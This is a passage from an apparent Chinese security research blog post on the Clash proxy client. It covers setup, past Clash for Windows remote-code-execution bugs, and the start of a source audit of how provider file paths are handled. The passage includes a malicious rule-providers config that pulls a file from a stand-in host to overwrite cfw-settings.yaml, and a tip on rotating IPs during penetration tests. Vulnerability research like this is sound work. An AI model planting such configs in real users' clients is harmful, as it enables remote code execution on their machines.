class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://www.gwggwebsite.top/clash/config -o ~/.config/clash/config.yaml</span><br><span class="line">$ <span class="built_in">head</span> -n 20 ~/.config/clash/config.yaml</span><br><span class="line"><span class="comment"># 所有节点均从公开互联网上抓取，使用clash自动检查可用性即可</span></span><br><span class="line"><span class="comment"># 抓取程序已开源： https://github.com/zu1k/proxypool</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># port of HTTP</span></span><br><span class="line">port: 7890</span><br><span class="line"></span><br><span class="line"><span class="comment"># port of SOCKS5</span></span><br><span class="line">socks-port: 7891</span><br><span class="line"></span><br><span class="line"><span class="comment"># (HTTP and SOCKS5 in one port)</span></span><br><span class="line"><span class="comment"># mixed-port: 7890</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># redir port for Linux and macOS</span></span><br><span class="line"><span class="comment"># redir-port: 7892</span></span><br><span class="line"></span><br><span class="line">allow-lan: <span class="literal">false</span></span><br><span class="line">mode: rule</span><br><span class="line">log-level: info</span><br><span class="line">external-controller: 127.0.0.1:9090</span><br></pre></td></tr></table></figure><p>如果未将Clash配置为systemd服务，那么也可以直接命令行启动Clash。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ clash                             </span><br><span class="line">INFO[0000] Start initial provider sg                    </span><br><span class="line">INFO[0000] Start initial provider au                    </span><br><span class="line">INFO[0000] Start initial provider fr                    </span><br><span class="line">INFO[0000] Start initial provider gb                    </span><br><span class="line">INFO[0000] Start initial provider ca                    </span><br><span class="line">INFO[0000] Start initial provider all                   </span><br><span class="line">INFO[0000] Start initial provider de                    </span><br><span class="line">INFO[0000] Start initial provider others                </span><br><span class="line">INFO[0000] Start initial provider us                    </span><br><span class="line">INFO[0000] Start initial provider ru                    </span><br><span class="line">INFO[0000] Start initial provider ch                    </span><br><span class="line">INFO[0000] Start initial provider cn                    </span><br><span class="line">INFO[0000] Start initial provider jp                    </span><br><span class="line">INFO[0000] Start initial provider <span class="built_in">nl</span>                    </span><br><span class="line">INFO[0000] Start initial compatible provider 选择国家       </span><br><span class="line">INFO[0000] Start initial compatible provider 全局选择       </span><br><span class="line">INFO[0000] HTTP proxy listening at: 127.0.0.1:7890      </span><br><span class="line">INFO[0000] SOCKS proxy listening at: 127.0.0.1:7891     </span><br><span class="line">INFO[0000] RESTful API listening at: 127.0.0.1:9090    </span><br></pre></td></tr></table></figure><p>如上便是成功启动了Clash，与此同时，Clash配置目录还产生了一个目录以及一些<code>provider</code>配置文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> .config/clash/&#123;config.yaml,www*&#125;               </span><br><span class="line">.config/clash/config.yaml</span><br><span class="line"></span><br><span class="line">.config/clash/www.gwggwebsite.top:</span><br><span class="line">provider-au.yaml  provider-cn.yaml  provider-gb.yaml  provider-others.yaml  provider-us.yaml</span><br><span class="line">provider-ca.yaml  provider-de.yaml  provider-jp.yaml  provider-ru.yaml      provider.yaml</span><br><span class="line">provider-ch.yaml  provider-fr.yaml  provider-nl.yaml  provider-sg.yaml</span><br></pre></td></tr></table></figure><p>通过如下测试，能确定Clash确实是成功工作的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ curl -x socks5://127.0.0.1:7891 ip.sb</span><br><span class="line">152.70.74.66</span><br><span class="line">$ curl cip.cc/152.70.74.66             </span><br><span class="line">IP: 152.70.74.66</span><br><span class="line">地址: 美国  美国</span><br><span class="line"></span><br><span class="line">数据二: 美国</span><br><span class="line"></span><br><span class="line">数据三: 美国加利福尼亚</span><br><span class="line"></span><br><span class="line">URL: http://www.cip.cc/152.70.74.66</span><br></pre></td></tr></table></figure><h4 id="macOS平台"><a href="#macOS平台" class="headerlink" title="macOS平台"></a>macOS平台</h4><p>在macOS上，一般都是使用有GUI的ClashX或CFW。以下为ClashX使用步骤，CFW的使用类似，不作过多说明。</p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/clashx-on-macos.png" alt="clashx-on-macos"></p><p>ClashX初次运行会在<code>~/.config/clash/</code>目录产生一个名为config.yaml的主配置文件，文件内容如下。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># From https://github.com/yichengchen/clashX/blob/master/ClashX/Resources/sampleConfig.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------#</span></span><br><span class="line"><span class="comment">## 配置文件需要放置在 $HOME/.config/clash/*.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 这份文件是clashX的基础配置文件，请尽量新建配置文件进行修改。</span></span><br><span class="line"><span class="comment">## ！！！只有这份文件的端口设置会随ClashX启动生效</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 如果您不知道如何操作，请参阅 官方Github文档 https://github.com/Dreamacro/clash/blob/dev/README.md</span></span><br><span class="line"><span class="comment">#---------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (HTTP and SOCKS5 in one port)</span></span><br><span class="line"><span class="attr">mixed-port:</span> <span class="number">7890</span></span><br><span class="line"><span class="comment"># RESTful API for clash</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9090</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">warning</span></span><br><span class="line"></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">DOMAIN-SUFFIX,google.com,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">DOMAIN-KEYWORD,google,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">DOMAIN,google.com,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">DOMAIN-SUFFIX,ad.com,REJECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">GEOIP,CN,DIRECT</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">MATCH,DIRECT</span></span><br></pre></td></tr></table></figure><p>ClashX的使用也是基于一份配置文件，同样只需将可用的主配置文件放到<code>~/.config/clash/</code>目录下，之后就可以使用了。具体步骤就是点击右上角ClashX图标，依次选择「Config」-「Remote config」-「Manage」-「Add」，将远程链接填入Url栏中即可自动下载远程的配置文件到本地。</p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/remote-clashx-config.png" alt="remote-clashx-config"></p><p>可以观察到一个现象，将远程配置文件下载到本地的同时，还在本地创建了一个目录，该目录存放的是各种不同地区的<code>provider</code>配置文件，与在Linux上观察的现象一样。</p><h4 id="Windows平台"><a href="#Windows平台" class="headerlink" title="Windows平台"></a>Windows平台</h4><p>Windows用户大多都是使用CFW，由于都是图形化操作，在使用上与ClashX类似，不做过多说明。</p><h3 id="使用Tips"><a href="#使用Tips" class="headerlink" title="使用Tips"></a>使用Tips</h3><p>Clash一个强大的功能就是能够管理不同的多种类型的代理协议，那么可以利用这一点方便在日常渗透的时候快速切换不同IP地址。只需在配置文件中使用负载均衡模式下，将<code>strategy</code>参数的值修改为<code>round-robin</code>即可，参考<a href="https://github.com/Dreamacro/clash/issues/1062">issue#1062</a>。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 部分配置参考</span></span><br><span class="line"><span class="comment"># load-balance: The request of the same eTLD+1 will be dial to the same proxy.</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;load-balance&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">load-balance</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ss1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">ss2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">vmess1</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&#x27;http://www.gstatic.com/generate_204&#x27;</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">strategy:</span> <span class="string">round-robin</span> <span class="comment"># or consistent-hashing</span></span><br></pre></td></tr></table></figure><p>效果如下图所示，秒级别切换IP代理地址。</p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/fast-switch-proxy.png" alt="fast-switch-proxy"></p><h2 id="0x01-历史漏洞"><a href="#0x01-历史漏洞" class="headerlink" title="0x01 历史漏洞"></a>0x01 历史漏洞</h2><h3 id="CFW-XSS2RCE-2022-x2F-02-x2F-23"><a href="#CFW-XSS2RCE-2022-x2F-02-x2F-23" class="headerlink" title="CFW XSS2RCE - 2022&#x2F;02&#x2F;23"></a>CFW XSS2RCE - 2022&#x2F;02&#x2F;23</h3><blockquote><p>Clash For Windows是由Electron提供的。如果一个XSS有效载荷是以代理的名义，我们可以在受害者的电脑上远程执行任何JavaScript代码。</p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/cfw-issue-2710.png" alt="cfw-issue-2710"></p></blockquote><p>详见此issue：<a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/2710">[Bug]: Remote Code Execution&#x2F;远程代码执行 #2710</a>。</p><h3 id="CFW路径穿越致使parsers-JS-RCE-2023-x2F-01-x2F-13"><a href="#CFW路径穿越致使parsers-JS-RCE-2023-x2F-01-x2F-13" class="headerlink" title="CFW路径穿越致使parsers JS RCE - 2023&#x2F;01&#x2F;13"></a>CFW路径穿越致使parsers JS RCE - 2023&#x2F;01&#x2F;13</h3><blockquote><p>Windows 上的 clash_for_windows 在 0.20.12 在订阅一个恶意链接时存在远程命令执行漏洞。因为对订阅文件中 rule-providers 的 path 的不安全处理导致 cfw-setting.yaml 会被覆盖，cfw-setting.yaml 中 parsers 的 js代码将会被执行。</p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/cfw-issue-3891.png" alt="cfw-issue-3891"></p></blockquote><p>详见此issue：<a href="https://github.com/Fndroid/clash_for_windows_pkg/issues/3891">[Bug]: Remote Code Execution&#x2F;远程代码执行 #3891</a>。</p><p>CFW开发于Electron。Electron是GitHub开发的一个使用JavaScript、HTML和CSS构建桌面应用程序的开源框架。它通过使用Node.js和Chromium的渲染引擎完成跨平台的桌面GUI应用程序的开发，因此Electron拥有直接执行Node.js代码的能力，并且内置了Chromium内核，通过一个XSS漏洞就有可能导致远程代码执行的危害。</p><p>CFW本身是支持Windows&#x2F;Linux&#x2F;macOS三个平台的，但从以上两个漏洞可以发现，由于CFW开发于Electron，变相的引入了一层攻击面，导致其使用风险过高，并且CFW源代码并未开源。一部分用户可能会转移去使用其他的Clash客户端软件，比如macOS用户可能会改用ClashX，Linux用户或许会直接使用Clash CLI工具。</p><h2 id="0x02-主配置文件"><a href="#0x02-主配置文件" class="headerlink" title="0x02 主配置文件"></a>0x02 主配置文件</h2><p>在进行下一步工作之前，先来了解下主配置文件。如下是主配置文件的部分内容，为节省长度，已省略注释和部分重复字段。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9090</span></span><br><span class="line"></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">全局选择</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">选择国家</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">选择国家</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">🇺🇸</span> <span class="string">美国</span></span><br><span class="line"></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">🇺🇸</span> <span class="string">美国</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">url-test</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&#x27;http://www.gstatic.com/generate_204&#x27;</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">use:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">us</span></span><br><span class="line"><span class="attr">proxy-providers:</span></span><br><span class="line">  <span class="attr">us:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://www.gwggwebsite.top/clash/proxies?c=US&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">www.gwggwebsite.top/provider-us.yaml</span></span><br><span class="line">    <span class="attr">health-check:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">interval:</span> <span class="number">600</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br></pre></td></tr></table></figure><p>值得留意的是<code>proxy-providers</code>中的<code>path</code>字段的值为<code>www.gwggwebsite.top/provider-us.yaml</code>。</p><p>在前面的基本使用小节，演示了Linux与macOS平台上Clash的基本使用。根据观察到的现象，提到了创建了一个文件夹<code>www.gwggwebsite.top</code>，其中还有一些<code>provider</code>配置文件。</p><p>那么可以肯定的是<code>proxy-providers</code>中的<code>path</code>字段的值对应的是本地的相对路径。</p><h2 id="0x03-代码审计分析"><a href="#0x03-代码审计分析" class="headerlink" title="0x03 代码审计分析"></a>0x03 代码审计分析</h2><p>现在已知的信息是，Clash和ClashX都会根据主配置文件中的<code>proxy-providers</code>的<code>path</code>参数值，下载<code>provider</code>配置文件至本地。而在CFW历史漏洞中也可以发现，CFW对订阅文件中<code>rule-providers</code>的<code>path</code>存在着不安全的处理，但由于CFW并未开源，我们无从得知CFW是怎么处理<code>rule-providers</code>的细节，不过通过对比<code>proxy-providers</code>和<code>rule-providers</code>的结构和内容，可以发现两者很相似。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">proxy-providers:</span></span><br><span class="line">  <span class="attr">us:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;https://www.gwggwebsite.top/clash/proxies?c=US&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">www.gwggwebsite.top/provider-us.yaml</span></span><br><span class="line">    <span class="attr">health-check:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">interval:</span> <span class="number">600</span></span><br><span class="line">      <span class="attr">url:</span> <span class="string">http://www.gstatic.com/generate_204</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rule-providers:</span></span><br><span class="line">  <span class="attr">p:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">behavior:</span> <span class="string">domain</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&quot;http://this.your.url/cfw-settings.yaml&quot;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">./cfw-settings.yaml</span></span><br><span class="line">    <span class="attr">interval:</span> <span class="number">86400</span></span><br></pre></td></tr></table></figure><p><code>type</code>、<code>url</code>、<code>path</code>三个键是完全对上了，所以怀疑这里的处理逻辑是差不多的。又因为ClashX和CFW的上游代码用的都是Clash，那么只需对Clash此处的功能点进行审计即可。</p><p>Clash配置的结构如下，位于<code>config/config.go</code>文件，着重留意<code>proxy-providers</code>，因为<code>path</code>存在于其中。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">type</span> <span class="string">RawConfig</span> <span class="string">struct</span> &#123;</span><br><span class="line"><span class="string">Port</span>               <span class="string">int</span>          <span class="string">`yaml:&quot;port&quot;`</span></span><br><span class="line"><span class="string">SocksPort</span>          <span class="string">int</span>          <span class="string">`yaml:&quot;socks-port&quot;`</span></span><br><span class="line"><span class="string">RedirPort</span>          <span class="string">int</span>          <span class="string">`yaml:&quot;redir-port&quot;`</span></span><br><span class="line"><span class="string">TProxyPort</span>         <span class="string">int</span>          <span class="string">`yaml:&quot;tproxy-port&quot;`</span></span><br><span class="line"><span class="string">MixedPort</span>          <span class="string">int</span>          <span class="string">`yaml:&quot;mixed-port&quot;`</span></span><br><span class="line"><span class="string">Authentication</span>     []<span class="string">string</span>     <span class="string">`yaml:&quot;authentication&quot;`</span></span><br><span class="line"><span class="string">AllowLan</span>           <span class="string">bool</span>         <span class="string">`yaml:&quot;allow-lan&quot;`</span></span><br><span class="line"><span class="string">BindAddress</span>        <span class="string">string</span>       <span class="string">`yaml:&quot;bind-address&quot;`</span></span><br><span class="line"><span class="string">Mode</span>               <span class="string">T.TunnelMode</span> <span class="string">`yaml:&quot;mode&quot;`</span></span><br><span class="line"><span class="string">LogLevel</span>           <span class="string">log.LogLevel</span> <span class="string">`yaml:&quot;log-level&quot;`</span></span><br><span class="line"><span class="string">IPv6</span>               <span class="string">bool</span>         <span class="string">`yaml:&quot;ipv6&quot;`</span></span><br><span class="line"><span class="string">ExternalController</span> <span class="string">string</span>       <span class="string">`yaml:&quot;external-controller&quot;`</span></span><br><span class="line"><span class="string">ExternalUI</span>         <span class="string">string</span>       <span class="string">`yaml:&quot;external-ui&quot;`</span></span><br><span class="line"><span class="string">Secret</span>             <span class="string">string</span>       <span class="string">`yaml:&quot;secret&quot;`</span></span><br><span class="line"><span class="string">Interface</span>          <span class="string">string</span>       <span class="string">`yaml:&quot;interface-name&quot;`</span></span><br><span class="line"><span class="string">RoutingMark</span>        <span class="string">int</span>          <span class="string">`yaml:&quot;routing-mark&quot;`</span></span><br><span class="line"><span class="string">Tunnels</span>            []<span class="string">Tunnel</span>     <span class="string">`yaml:&quot;tunnels&quot;`</span></span><br><span class="line"></span><br><span class="line"><span class="string">ProxyProvider</span> <span class="string">map</span>[<span class="string">string</span>]<span class="string">map</span>[<span class="string">string</span>]<span class="string">any</span> <span class="string">`yaml:&quot;proxy-providers&quot;`</span></span><br><span class="line"><span class="string">Hosts</span>         <span class="string">map</span>[<span class="string">string</span>]<span class="string">string</span>         <span class="string">`yaml:&quot;hosts&quot;`</span></span><br><span class="line"><span class="string">DNS</span>           <span class="string">RawDNS</span>                    <span class="string">`yaml:&quot;dns&quot;`</span></span><br><span class="line"><span class="string">Experimental</span>  <span class="string">Experimental</span>              <span class="string">`yaml:&quot;experimental&quot;`</span></span><br><span class="line"><span class="string">Profile</span>       <span class="string">Profile</span>                   <span class="string">`yaml:&quot;profile&quot;`</span></span><br><span class="line"><span class="string">Proxy</span>         []<span class="string">map</span>[<span class="string">string</span>]<span class="string">any</span>          <span class="string">`yaml:&quot;proxies&quot;`</span></span><br><span class="line"><span class="string">ProxyGroup</span>    []<span class="string">map</span>[<span class="string">string</span>]<span class="string">any</span>          <span class="string">`yaml:&quot;proxy-groups&quot;`</span></span><br><span class="line"><span class="string">Rule</span>          []<span class="string">string</span>                  <span class="string">`yaml:&quot;rules&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与<code>proxy-providers</code>相关的代码如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">parseProxies</span><span class="params">(cfg *RawConfig)</span></span> (proxies <span class="keyword">map</span>[<span class="type">string</span>]C.Proxy, providersMap <span class="keyword">map</span>[<span class="type">string</span>]providerTypes.ProxyProvider, err <span class="type">error</span>) &#123;</span><br><span class="line">proxies = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]C.Proxy)</span><br><span class="line">providersMap = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]providerTypes.ProxyProvider)</span><br><span class="line">proxyList := []<span class="type">string</span>&#123;&#125;</span><br><span class="line">proxiesConfig := cfg.Proxy</span><br><span class="line">groupsConfig := cfg.ProxyGroup</span><br><span class="line">providersConfig := cfg.ProxyProvider</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// parse and initial providers</span></span><br><span class="line"><span class="keyword">for</span> name, mapping := <span class="keyword">range</span> providersConfig &#123;</span><br><span class="line"><span class="keyword">if</span> name == provider.ReservedName &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;can not defined a provider called `%s`&quot;</span>, provider.ReservedName)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pd, err := provider.ParseProxyProvider(name, mapping)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;parse proxy provider %s error: %w&quot;</span>, name, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">providersMap[name] = pd</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, provider := <span class="keyword">range</span> providersMap &#123;</span><br><span class="line">log.Infoln(<span class="string">&quot;Start initial provider %s&quot;</span>, provider.Name())</span><br><span class="line"><span class="keyword">if</span> err := provider.Initial(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;initial proxy provider %s error: %w&quot;</span>, provider.Name(), err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> proxies, providersMap, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/config-parseProxies.png" alt="config-parseProxies"></p><p>首先是创建了一个空map <code>providersMap</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">providersMap = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]providerTypes.ProxyProvider)</span><br></pre></td></tr></table></figure><p><code>providerTypes.ProxyProvider</code>是一个接口。其中的<code>Provider</code>接口代码位置在其之上。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Provider interface</span></span><br><span class="line"><span class="keyword">type</span> Provider <span class="keyword">interface</span> &#123;</span><br><span class="line">Name() <span class="type">string</span></span><br><span class="line">VehicleType() VehicleType</span><br><span class="line">Type() ProviderType</span><br><span class="line">Initial() <span class="type">error</span></span><br><span class="line">Update() <span class="type">error</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ProxyProvider interface</span></span><br><span class="line"><span class="keyword">type</span> ProxyProvider <span class="keyword">interface</span> &#123;</span><br><span class="line">Provider</span><br><span class="line">Proxies() []constant.Proxy</span><br><span class="line"><span class="comment">// Touch is used to inform the provider that the proxy is actually being used while getting the list of proxies.</span></span><br><span class="line"><span class="comment">// Commonly used in DialContext and DialPacketConn</span></span><br><span class="line">Touch()</span><br><span class="line">HealthCheck()</span><br></pre></td></tr></table></figure><p>创建<code>providersMap</code>之后，中间的其他变量赋值先不管，直接来到解析和初始化<code>providers</code>相关代码。</p><h3 id="parse-providers"><a href="#parse-providers" class="headerlink" title="parse providers"></a>parse providers</h3><p>先对第一个for循环语句解析providers的代码进行分析，跟进其中的<code>provider.ParseProxyProvider</code>，进入到<code>adapter/provider/parser.go</code>文件。其中的<code>proxyProviderSchema</code>结构体如下，着重关注<code>path</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 